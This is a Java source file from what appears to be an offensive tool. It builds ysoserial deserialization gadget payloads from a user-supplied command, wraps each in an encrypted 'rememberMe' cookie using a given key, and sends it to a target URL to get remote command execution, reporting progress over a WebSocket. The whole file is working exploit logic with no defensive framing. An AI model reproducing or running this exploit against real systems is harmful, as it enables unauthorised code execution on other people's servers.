package com.madao.jvav.util;

import com.madao.jvav.pojo.Payloads;
import com.madao.jvav.service.WebSocketService;
import org.springframework.stereotype.Component;

import java.io.IOException;
import java.util.List;

@Component
public class ExploitGadget {

    public void exploit(Payloads payloads) throws IOException {

        List<String> gadgets = payloads.getPayloadList();
        String key = payloads.getKey();
        String url = payloads.getUrl();
        String userInput = payloads.getCmd();

        for (String gadget : gadgets) {
            String command = "java -jar ysoserial.jar " + gadget + " \"" + userInput + "\"";
            WebSocketService.sendMessage(command);
            WebSocketService.sendMessage("[>] Using Gadget: "+gadget);

            try {
                byte[] payloadByte = Function.getExecByte(command);
                String rememberMeCookie = Function.getRememberMeCookie(payloadByte, key);
                Function.sendToTarget(url, rememberMeCookie);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        WebSocketService.sendMessage("[-] Ceye信息会存在一定延迟，请耐心等待后再刷新表格");

    }
}
